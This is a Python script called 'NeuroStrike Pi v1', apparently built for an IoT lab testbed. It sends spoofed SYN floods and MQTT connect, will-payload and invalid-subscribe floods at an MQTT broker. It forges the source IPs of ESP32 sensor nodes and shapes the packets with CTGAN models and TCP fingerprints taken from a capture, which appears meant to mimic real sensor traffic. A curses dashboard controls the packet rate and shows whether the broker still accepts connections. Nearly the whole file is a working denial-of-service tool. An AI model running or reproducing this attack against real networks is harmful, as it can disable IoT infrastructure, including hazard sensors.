import os, sys, time, math, random, pickle, threading, curses, signal, itertools
import socket as _socket
import numpy as np

if os.geteuid() != 0:
    print("  Run with sudo: sudo python3 neurostrike_pi_v1_final.py"); sys.exit(1)

try:
    from scapy.all import IP, TCP, Raw, send, conf
    conf.verb = 0
except ImportError:
    print("  pip install scapy"); sys.exit(1)

try:
    import torch
    _o = torch.load
    torch.load = lambda *a, **kw: _o(*a, **{**kw, "map_location": "cpu"})
except ImportError:
    pass

# NETWORK TOPOLOGY — exact from final_network_capture.csv
DEFAULT_IFACE = "wlan0"
BROKER_IP     = "192.168.0.133"
BROKER_PORT   = 1883
PI_IP         = "192.168.0.109"

# Spoofed source IPs — the real IoT node IPs seen in the capture
IOT_NODES = [
    {"ip": "192.168.0.153", "role": "ESP32-hazards"},
    {"ip": "192.168.0.160", "role": "ESP32-traffic"},
    {"ip": "192.168.0.176", "role": "ESP32-environment"},
]
IOT_IPS = [n["ip"] for n in IOT_NODES]

# TCP parameters extracted from capture
# ESP32 advertises small windows (embedded device, constrained RAM)
# Observed: 5760, 5749, 5660, 4393, 4381, 5747, 5756
ESP32_WINDOWS = [5760, 5749, 5756, 5660, 4393, 4381, 5747]
BROKER_WINDOW = 64076   # broker's advertised window
ESP32_MSS     = 1436    # ESP32 WiFi (802.11 MTU = 1500 - IP(20) - TCP(20) - LLC overhead)
BROKER_MSS    = 1460    # broker MSS
ESP32_TTL     = 128     # ESP32 IDF default TTL
BROKER_TTL    = 64

# Ephemeral port pool — anchored to observed ports in capture
# Observed: 60788, 56589, 49716, 49717, 49718, 49707
EPH_PORT_POOL = list(range(49152, 65535))

# MQTT topics observed in the capture
TOPICS_HAZARDS     = ["hazards/flame_1", "hazards/flame_alert_1", "hazards/water_level_1"]
TOPICS_TRAFFIC     = ["traffic/ultrasonic_1", "traffic/motion_1"]
TOPICS_ENVIRONMENT = ["environment/temperature_1", "environment/light_1"]
TOPICS_RPI         = ["rpi/broadcast"]
ALL_TOPICS         = TOPICS_HAZARDS + TOPICS_TRAFFIC + TOPICS_ENVIRONMENT + TOPICS_RPI

MODEL_DIR    = "/home/client2/neurostrike_models"
MAX_PPS      = 500     # practical limit with handshakes
PPS_STEP     = 25
BLEND_RATIOS = [0.30, 0.50, 0.70]

# ATTACK PROFILES
# All feature values calibrated to capture observations.
BASE_PROFILES = {
    "SYN_TCP_Flooding": {
        "label": "SYN FLOOD", "model_key": "SYN_TCP_Flooding", "short": "SYN",
        # SYN pkts: 62 bytes (14 Ether + 20 IP + 24 TCP with MSS+SACK options)
        "flag_syn":1,"flag_ack":0,"flag_fin":0,"flag_rst":0,"flag_psh":0,"flag_urg":0,
        "port_direction":1,"payload_len":0,
        "packet_len":62,"delta_time":0.001,"delta_time_std":0.0005,
        "window_choices":ESP32_WINDOWS,
        "send_handshake":False,
    },
    "Basic_Connect_Flooding": {
        "label": "BASIC CONNECT FLOOD", "model_key": "Basic_Connect_Flooding", "short": "Basic",
        # MQTT CONNECT after handshake — ~81 bytes (capture row 447)
        "flag_syn":0,"flag_ack":1,"flag_fin":0,"flag_rst":0,"flag_psh":1,"flag_urg":0,
        "port_direction":1,"payload_len":14,
        "packet_len":81,"delta_time":0.002,"delta_time_std":0.001,
        "window_choices":ESP32_WINDOWS,
        "send_handshake":True,
    },
    "Delayed_Connect_Flooding": {
        "label": "DELAYED CONNECT FLOOD", "model_key": "Delayed_Connect_Flooding", "short": "Delayed",
        "flag_syn":0,"flag_ack":1,"flag_fin":0,"flag_rst":0,"flag_psh":1,"flag_urg":0,
        "port_direction":1,"payload_len":14,
        "packet_len":81,"delta_time":0.05,"delta_time_std":0.02,
        "window_choices":ESP32_WINDOWS,
        "send_handshake":True,
    },
    "Invalid_Subscription_Flooding": {
        "label": "INVALID SUBSCRIBE FLOOD", "model_key": "Invalid_Subscription_Flooding", "short": "Invalid",
        # MQTT SUBSCRIBE — ~74 bytes (capture row 451)
        "flag_syn":0,"flag_ack":1,"flag_fin":0,"flag_rst":0,"flag_psh":1,"flag_urg":0,
        "port_direction":1,"payload_len":10,
        "packet_len":74,"delta_time":0.003,"delta_time_std":0.001,
        "window_choices":ESP32_WINDOWS,
        "send_handshake":True,
    },
    "Connect_Flooding_with_WILL_payload": {
        "label": "WILL PAYLOAD FLOOD", "model_key": "Connect_Flooding_with_WILL_payload", "short": "WILL",
        # MQTT CONNECT + WILL — larger payload
        "flag_syn":0,"flag_ack":1,"flag_fin":0,"flag_rst":0,"flag_psh":1,"flag_urg":0,
        "port_direction":1,"payload_len":80,
        "packet_len":134,"delta_time":0.002,"delta_time_std":0.001,
        "window_choices":ESP32_WINDOWS,
        "send_handshake":True,
    },
}

PURE_NAMES  = list(BASE_PROFILES.keys())
BLEND_PAIRS = list(itertools.combinations(PURE_NAMES, 2))

def _build_modes():
    m = []
    for n in PURE_NAMES:
        m.append({"type":"pure","name":n,"label":BASE_PROFILES[n]["label"],
                  "short":BASE_PROFILES[n]["short"],"base_a":n,"base_b":None,"alpha":1.0})
    for a, b in BLEND_PAIRS:
        for alpha in BLEND_RATIOS:
            sa=BASE_PROFILES[a]["short"]; sb=BASE_PROFILES[b]["short"]
            m.append({"type":"blend",
                      "name":f"{sa}_x_{sb}_{int(alpha*100)}_{int((1-alpha)*100)}",
                      "label":f"{sa}×{sb} {int(alpha*100)}/{int((1-alpha)*100)}",
                      "short":f"{sa}×{sb}","base_a":a,"base_b":b,"alpha":alpha})
    return m

ALL_MODES = _build_modes()
N_MODES   = len(ALL_MODES)   # 5 + 30 = 35

# MQTT PAYLOAD BUILDERS
# Formats match Wireshark dissections in the capture.
def _varlen(n: int) -> bytes:
    out = []
    while True:
        b = n & 0x7F; n >>= 7
        out.append(b | (0x80 if n else 0))
        if not n: break
    return bytes(out)

def _mqtt_connect(with_will: bool = False) -> bytes:
    cid   = f"esp_{random.randint(0,0xFFFF):04x}".encode()
    flags = 0b11001110 if with_will else 0b00000010   # WILL+clean vs clean only
    keepalive = 60
    var   = bytes([0x00,0x04]) + b"MQTT" + bytes([0x04, flags, keepalive>>8, keepalive&0xFF])
    pay   = bytes([0x00, len(cid)]) + cid
    if with_will:
        wt  = random.choice(ALL_TOPICS).encode()
        wm  = f"ALERT_{random.randint(0,999)}".encode()
        pay += bytes([0x00, len(wt)]) + wt + bytes([0x00, len(wm)]) + wm
    rem = var + pay
    return bytes([0x10]) + _varlen(len(rem)) + rem

def _mqtt_publish() -> bytes:
    topic = random.choice(ALL_TOPICS)
    # Realistic sensor payloads matching the IoT node roles in capture
    if   "temperature" in topic: val = f'{{"temp":{random.uniform(20,40):.1f}}}'
    elif "light"       in topic: val = f'{{"lux":{random.randint(100,1000)}}}'
    elif "ultrasonic"  in topic: val = f'{{"dist_cm":{random.randint(5,200)}}}'
    elif "motion"      in topic: val = f'{{"motion":{random.randint(0,1)}}}'
    elif "flame"       in topic: val = f'{{"flame":{random.randint(0,1)}}}'
    elif "water"       in topic: val = f'{{"level_pct":{random.randint(0,100)}}}'
    else:                        val = f'{{"v":{random.randint(0,255)}}}'
    t   = topic.encode(); p = val.encode()
    rem = bytes([0x00, len(t)]) + t + p
    return bytes([0x30]) + _varlen(len(rem)) + rem

def _mqtt_subscribe() -> bytes:
    topic = random.choice([
        "#", "+/+", "sensor/+", "status/#",
        "invalid/##",          # malformed wildcard
        random.choice(ALL_TOPICS),
    ])
    pid = random.randint(1, 0xFFFF)
    t   = topic.encode()
    pay = bytes([pid>>8, pid&0xFF, 0x00, len(t)]) + t + bytes([0x00])
    return bytes([0x82]) + _varlen(len(pay)) + pay

def _mqtt_pingreq() -> bytes:
    return bytes([0xC0, 0x00])

PAYLOAD_FN = {
    "SYN_TCP_Flooding":                   lambda: b"",
    "Basic_Connect_Flooding":             lambda: _mqtt_connect(with_will=False),
    "Delayed_Connect_Flooding":           lambda: _mqtt_connect(with_will=False),
    "Invalid_Subscription_Flooding":      lambda: _mqtt_subscribe(),
    "Connect_Flooding_with_WILL_payload": lambda: _mqtt_connect(with_will=True),
}

def _send_spoofed_syn(src_ip, src_port, win, iface):
    isn = random.randint(1_000_000, 3_000_000_000)
    pkt = (IP(src=src_ip, dst=BROKER_IP, ttl=ESP32_TTL) /
           TCP(sport=src_port, dport=BROKER_PORT,
               flags="S", seq=isn, ack=0, window=win,
               options=[("MSS", ESP32_MSS), ("SAckOK", b"")]))
    send(pkt, iface=iface, verbose=False)
    return isn

def _send_spoofed_mqtt(src_ip, src_port, isn, win, mqtt_payload, iface):
    cli_seq = isn + 1
    ack_pkt = (IP(src=src_ip, dst=BROKER_IP, ttl=ESP32_TTL) /
               TCP(sport=src_port, dport=BROKER_PORT,
                   flags="A", seq=cli_seq, ack=1, window=win))
    send(ack_pkt, iface=iface, verbose=False)
    data_pkt = (IP(src=src_ip, dst=BROKER_IP, ttl=ESP32_TTL) /
                TCP(sport=src_port, dport=BROKER_PORT,
                    flags="PA", seq=cli_seq, ack=1, window=win) /
                Raw(load=mqtt_payload))
    send(data_pkt, iface=iface, verbose=False)


# TCP PROBE  — honest kernel socket from PI_IP, measures broker health
class BrokerProbe:
    INTERVAL = 3.0
    TIMEOUT  = 2.0

    def __init__(self):
        self._lock       = threading.Lock()
        self.reachable   = True
        self.connect_ok  = True
        self.connect_ms  = 0.0
        self.probe_count = 0
        self.ok_count    = 0

    def start(self):
        threading.Thread(target=self._loop, daemon=True).start()

    def _loop(self):
        while True:
            t0 = time.time()
            ok = False; ms = 0.0
            try:
                sock = _socket.socket(_socket.AF_INET, _socket.SOCK_STREAM)
                sock.settimeout(self.TIMEOUT)
                sock.connect((BROKER_IP, BROKER_PORT))
                ms = (time.time() - t0) * 1000
                ok = True
                sock.close()
            except Exception:
                ms = (time.time() - t0) * 1000
            with self._lock:
                self.reachable   = ok
                self.connect_ok  = ok
                self.connect_ms  = ms
                self.probe_count += 1
                if ok: self.ok_count += 1
            time.sleep(self.INTERVAL)

    def status(self):
        with self._lock:
            return self.reachable, self.connect_ms

    def full_status(self):
        with self._lock:
            return {
                "ok":           self.connect_ok,
                "ms":           self.connect_ms,
                "probes":       self.probe_count,
                "ok_count":     self.ok_count,
                "success_rate": self.ok_count / max(self.probe_count, 1),
            }


# CTGAN MODEL CACHE + SAMPLE BUFFER
class ModelCache:
    def __init__(self, d):
        self.d=d; self._m={}; self._f=set()
    def get(self, name):
        k=BASE_PROFILES[name]["model_key"]
        if k in self._f: return None
        if k not in self._m:
            p=os.path.join(self.d,f"ctgan_model_{k}.pkl")
            if os.path.exists(p):
                try:
                    with open(p,"rb") as f: self._m[k]=pickle.load(f)
                except Exception: self._f.add(k)
            else: self._f.add(k)
        return self._m.get(k)
    def loaded(self): return len(self._m)
    def status(self, name):
        k=BASE_PROFILES[name]["model_key"]
        return "CTGAN" if k in self._m else ("FAIL" if k in self._f else "LOAD")

class SampleBuffer:
    BUF=500
    def __init__(self):
        self._b={n:[] for n in PURE_NAMES}; self._l=threading.Lock()
    def get(self, name, mc):
        with self._l:
            if self._b[name]: return self._b[name].pop()
        return None
    def refill(self, name, mc):
        m=mc.get(name)
        if not m: return
        try:
            rows=m.sample(self.BUF).to_dict("records")
            with self._l: self._b[name].extend(rows)
        except Exception: pass
    def start(self, mc):
        def _w():
            while True:
                for n in PURE_NAMES:
                    with self._l: low=len(self._b[n])<self.BUF//2
                    if low: self.refill(n,mc)
                time.sleep(0.1)
        threading.Thread(target=_w,daemon=True).start()

# PACKET BUILD + SEND
_eph_idx  = {ip: random.randint(0, len(EPH_PORT_POOL)-1) for ip in IOT_IPS}

def _next_port(src_ip: str) -> int:
    if src_ip not in _eph_idx:
        _eph_idx[src_ip] = random.randint(0, len(EPH_PORT_POOL)-1)
    
    _eph_idx[src_ip] = (_eph_idx[src_ip] + 1) % len(EPH_PORT_POOL)
    return EPH_PORT_POOL[_eph_idx[src_ip]]

def _stat_row(name):
    p = BASE_PROFILES[name]
    return {
        "delta_time":      max(0, random.gauss(p["delta_time"], p["delta_time_std"])),
        "packet_len":      p["packet_len"],
        "flag_syn":        p["flag_syn"],  "flag_ack": p["flag_ack"],
        "flag_fin":        p["flag_fin"],  "flag_rst": p["flag_rst"],
        "flag_psh":        p["flag_psh"],  "flag_urg": p["flag_urg"],
        "port_direction":  p["port_direction"],
        "payload_len":     p["payload_len"],
        "tcp_window_size": random.choice(p["window_choices"]),
    }

def _get_row(mode, mc, sb):
    if mode["type"] == "pure":
        n = mode["base_a"]; r = sb.get(n, mc)
        return (r or _stat_row(n)), n
    src = mode["base_a"] if random.random() < mode["alpha"] else mode["base_b"]
    r   = sb.get(src, mc)
    return (r or _stat_row(src)), src

def send_attack_packet(row: dict, attack_name: str, iface: str) -> int:
    p        = BASE_PROFILES[attack_name]
    src_ip   = random.choice(IOT_IPS)          # spoofed ESP32 IP
    src_port = _next_port(src_ip)
    win_raw  = float(row.get("tcp_window_size", random.choice(p["window_choices"])))
    win      = int(max(512, min(win_raw, 65535)))

    try:
        # SYN flood
        if attack_name == "SYN_TCP_Flooding":
            isn = random.randint(1_000_000, 3_000_000_000)
            pkt = (IP(src=src_ip, dst=BROKER_IP, ttl=ESP32_TTL) /
                   TCP(sport=src_port, dport=BROKER_PORT,
                       flags="S", seq=isn, ack=0, window=win,
                       options=[("MSS", ESP32_MSS), ("SAckOK", b"")]))
            send(pkt, iface=iface, verbose=False)
            return len(pkt)

        # MQTT-based attacks — blind spoofed send
        # Delayed connect: pause before sending payload (slow attack pattern)
        if attack_name == "Delayed_Connect_Flooding":
            dt = max(0, random.gauss(p["delta_time"], p["delta_time_std"]))
            if dt > 0: time.sleep(min(dt, 5.0))

        mqtt = PAYLOAD_FN[attack_name]()
        isn  = _send_spoofed_syn(src_ip, src_port, win, iface)
        _send_spoofed_mqtt(src_ip, src_port, isn, win, mqtt, iface)
        return 62 + 54 + 54 + len(mqtt)   # SYN + ACK + PSH+ACK+payload approx

    except Exception:
        return 0

# SHARED STATE
class State:
    def __init__(self):
        self.lock            = threading.Lock()
        self.on              = False
        self.mode_idx        = 0
        self.iface           = DEFAULT_IFACE
        self.tgt_pps         = 50
        self.sent            = 0
        self.errs            = 0
        self.hs_ok           = 0   # kept for compatibility (counts MQTT attack sends)
        self.hs_fail         = 0
        self._wt             = []; self._wb = []
        self.pps             = 0.0; self.bps = 0.0
        self.t_start         = None
        # Probe fields — updated from BrokerProbe every cycle
        self.broker_up       = True
        self.broker_rtt      = 0.0
        self.probe_ok_rate   = 1.0    # fraction of recent probes that connected
        self.probe_ms        = 0.0    # latest connect latency

    def record(self, nb, is_hs_attack):
        now = time.time()
        with self.lock:
            if nb > 0:
                self.sent += 1
                self._wt.append(now); self._wb.append(nb)
                if is_hs_attack: self.hs_ok += 1
            else:
                self.errs += 1
                if is_hs_attack: self.hs_fail += 1
            c = now - 2.0
            while self._wt and self._wt[0] < c:
                self._wt.pop(0); self._wb.pop(0)
            n = len(self._wt)
            if n >= 2:
                s = self._wt[-1] - self._wt[0]
                if s > 0: self.pps = n / s; self.bps = sum(self._wb) / s

# SENDER THREAD
def sender(st: State, mc: ModelCache, sb: SampleBuffer, probe: BrokerProbe):
    while True:
        try:
            with st.lock:
                on  = st.on
                mi  = st.mode_idx
                ifc = st.iface
                tgt = st.tgt_pps

            if not on:
                time.sleep(0.05)
                continue

            # Update probe status into shared state
            pstat = probe.full_status()
            with st.lock:
                st.broker_up     = pstat["ok"]
                st.broker_rtt    = pstat["ms"]
                st.probe_ok_rate = pstat["success_rate"]
                st.probe_ms      = pstat["ms"]

            t0   = time.time()
            mode = ALL_MODES[mi]
            row, src = _get_row(mode, mc, sb)
            is_mqtt  = BASE_PROFILES[src]["send_handshake"]  # True for MQTT attacks

            nb = send_attack_packet(row, src, ifc)
            st.record(nb, is_mqtt)

        except Exception as e:
            print("error in sender", e)
            import traceback
            traceback.print_exc()

        elapsed = time.time() - t0
        sl = max(0.0, 1.0/max(tgt, 1) - elapsed)
        if sl > 0: time.sleep(sl)

# DASHBOARD
def _bar(v, w=22):
    f = int(min(max(v,0),1)*w)
    return "█"*f + "░"*(w-f)

def dashboard(scr, st: State, mc: ModelCache, probe: BrokerProbe):
    curses.curs_set(0); scr.nodelay(True); curses.start_color()
    curses.use_default_colors()
    curses.init_pair(1,curses.COLOR_GREEN, -1)
    curses.init_pair(2,curses.COLOR_RED,   -1)
    curses.init_pair(3,curses.COLOR_YELLOW,-1)
    curses.init_pair(4,curses.COLOR_CYAN,  -1)
    curses.init_pair(5,curses.COLOR_WHITE, -1)
    G=curses.color_pair(1)|curses.A_BOLD
    R=curses.color_pair(2)|curses.A_BOLD
    Y=curses.color_pair(3)|curses.A_BOLD
    C=curses.color_pair(4)|curses.A_BOLD
    W=curses.color_pair(5)

    page=0; lk=0; MPP=10; NP=math.ceil(N_MODES/MPP)

    while True:
        k=scr.getch(); now=time.time() 
        if   k in [ord(' '), 32] and now-lk>.2:
            with st.lock:
                st.on=not st.on
                if st.on and st.t_start is None: st.t_start=now
                elif not st.on: st.t_start=None
            lk=now
        elif k==ord('q'):
            with st.lock: st.on=False; break
        elif k==ord('n') and now-lk>.2: page=(page+1)%NP; lk=now
        elif k==ord('p') and now-lk>.2: page=(page-1)%NP; lk=now
        elif k==curses.KEY_DOWN and now-lk>.15:
            with st.lock: st.mode_idx=(st.mode_idx+1)%N_MODES
            page=st.mode_idx//MPP; lk=now
        elif k==curses.KEY_UP and now-lk>.15:
            with st.lock: st.mode_idx=(st.mode_idx-1)%N_MODES
            page=st.mode_idx//MPP; lk=now
        elif k==ord('+') and now-lk>.1:
            with st.lock: st.tgt_pps=min(st.tgt_pps+PPS_STEP,MAX_PPS); lk=now
        elif k==ord('-') and now-lk>.1:
            with st.lock: st.tgt_pps=max(st.tgt_pps-PPS_STEP,10); lk=now

        scr.clear(); H,W_=scr.getmaxyx(); W2=min(W_-1,78)
        def s(y,x,t,a=W):
            try:
                if y<H-1 and x<W_-1: scr.addstr(y,x,t[:W_-x-1],a)
            except curses.error: pass

        ln=0; sep="="*W2; dsh="-"*W2
        s(ln,0,sep,C); ln+=1
        tt="ATTACKER DASHBOARD (MQTT ATTACK ENGINE) — NeuroStrike Pi v1"
        s(ln,max(0,(W2-len(tt))//2),tt,C|curses.A_BOLD); ln+=1
        s(ln,0,sep,C); ln+=2

        with st.lock:
            on=st.on; mi=st.mode_idx; tgt=st.tgt_pps
            pps=st.pps; bps=st.bps; sent=st.sent; errs=st.errs
            ts=st.t_start; ifc=st.iface
            hok=st.hs_ok; hfail=st.hs_fail
            b_up=st.broker_up; b_ms=st.probe_ms
            b_rate=st.probe_ok_rate
            mc_n=mc.loaded()

        mode=ALL_MODES[mi]; mtype="PURE" if mode["type"]=="pure" else "BLEND"
        elaps=now-ts if ts else 0

        # Broker status string — shows TCP probe result, not ICMP
        if b_up:
            b_str = f"ACCEPTING  connect={b_ms:.0f}ms  ok={b_rate*100:.0f}%"
        else:
            b_str = f"BLOCKING   connect={b_ms:.0f}ms  ok={b_rate*100:.0f}%"

        s(ln,0,f"Interface   : {ifc}",W); ln+=1
        s(ln,0,f"Target      : {BROKER_IP}:{BROKER_PORT}",W); ln+=1
        s(ln,0,f"Attack Mode : [{mtype}] ",W); s(ln,18,mode["label"],Y); ln+=1
        s(ln,0,f"Broker      : ",W); s(ln,14,b_str,G if b_up else R); ln+=1
        s(ln,0,f"Spoof IPs   : {', '.join(IOT_IPS)}",W); ln+=1
        s(ln,0,f"Models      : {mc_n}/5 CTGAN loaded",W); ln+=2

        s(ln,0,dsh,W); ln+=1
        s(ln,0,"ATTACK CONTROL PANEL",C|curses.A_BOLD); ln+=1
        ss="[ ON  ]" if on else "[ OFF ]"
        s(ln,0,"  Status    : ",W); s(ln,14,ss,G if on else R)
        s(ln,24,"  [SPACE] toggle",W); ln+=1
        s(ln,0,f"  Target PPS: {tgt:>5}  [+/-] adjust",W); ln+=2

        s(ln,0,f"  ATTACK MODES  Page {page+1}/{NP}  [↑↓] select  [N/P] page",Y); ln+=1
        si=page*MPP; ei=min(si+MPP,N_MODES)
        for i in range(si,ei):
            m=ALL_MODES[i]; tp="P" if m["type"]=="pure" else "B"
            s(ln,0,f"  [{i:02d}]{'▶' if i==mi else ' '}[{tp}] {m['label'][:42]}",
              G if i==mi else W); ln+=1
        ln+=1

        s(ln,0,dsh,W); ln+=1
        s(ln,0,"Traffic:",W); ln+=1
        s(ln,0,f"  Packets Sent    : {sent:>8,}",W); ln+=1
        s(ln,0,f"  Packets/sec     : {pps:>8.1f}",W); ln+=1
        s(ln,0,f"  Throughput      : {bps/1024:>8.1f} KB/s",W); ln+=1
        s(ln,0,f"  Send Errors     : {errs:>8,}",R if errs else W); ln+=1

        hs_tot=hok+hfail
        s(ln,0,f"  MQTT Sends      : {hok:>5} ok / {hfail:>5} fail",
          G if hok>0 else (Y if hfail>0 else W)); ln+=1
        probe_bar = _bar(b_rate, W2-24)
        s(ln,0,f"  Broker Probe    : [{probe_bar}] {b_rate*100:.0f}% accept",
          G if b_rate>0.7 else (Y if b_rate>0.2 else R)); ln+=1
        s(ln,0,f"  Session Time    : {int(elaps):>8}s",W); ln+=2

        eff=min(pps/max(tgt,1),1)
        s(ln,0,"Attack Effectiveness:",W); ln+=1
        s(ln,0,f"  [{_bar(eff,W2-4)}]",G if eff>.7 else Y); ln+=1
        s(ln,0,f"  {pps:.0f}/{tgt} pps  ({eff*100:.0f}%)",W); ln+=2

        s(ln,0,dsh,W); ln+=1
        s(ln,0,"  [SPACE] ON/OFF  [↑↓] Mode  [N/P] Page  [+/-] Rate  [Q] Quit",Y)
        try: scr.addstr(H-1,0,sep[:W2],curses.color_pair(4))
        except curses.error: pass
        scr.refresh(); scr.erase(); time.sleep(0.1)

# MAIN
def main():
    print("="*68)
    print("NeuroStrike Pi v1 FINAL — Real-Time Attack Generator + Dashboard")
    print("="*68)
    print(f"  Broker    : {BROKER_IP}:{BROKER_PORT}")
    print(f"  Pi (us)   : {PI_IP} / {DEFAULT_IFACE}")
    print(f"  Spoof IPs : {IOT_IPS}  (real IoT nodes from capture)")
    print(f"  ESP32 MSS : {ESP32_MSS}  Windows: {ESP32_WINDOWS[:4]}...")
    print(f"  Topics    : {ALL_TOPICS}")
    print(f"  Modes     : {N_MODES}  ({len(PURE_NAMES)} pure + {N_MODES-len(PURE_NAMES)} blended)")
    print(f"  TCP       : Full 3-way handshake (SYN flood = SYN-only)")
    print(f"  TCP probe : every {BrokerProbe.INTERVAL}s  (kernel socket from {PI_IP})")
    print()

    print("="*68)

    mc=ModelCache(MODEL_DIR); sb=SampleBuffer(); sb.start(mc)
    probe=BrokerProbe(); probe.start()   # kernel socket probe — no iface needed
    st=State(); st.iface=DEFAULT_IFACE; st.on=True

    t = threading.Thread(target=sender, args=(st, mc, sb, probe), daemon=True)
    t.start()

    def _bye(sig, frm):
        with st.lock: st.on=False
        curses.endwin()
        print(f"\n  Packets: {st.sent:,}  Errors: {st.errs}")
        print(f"  MQTT sends ok: {st.hs_ok}  fail: {st.hs_fail}")
        sys.exit(0)

    signal.signal(signal.SIGINT,_bye)
    try: curses.wrapper(dashboard,st,mc,probe)
    except Exception as e: curses.endwin(); print(f"Dashboard error: {e}")
    _bye(None,None)

if __name__=="__main__":
    main()
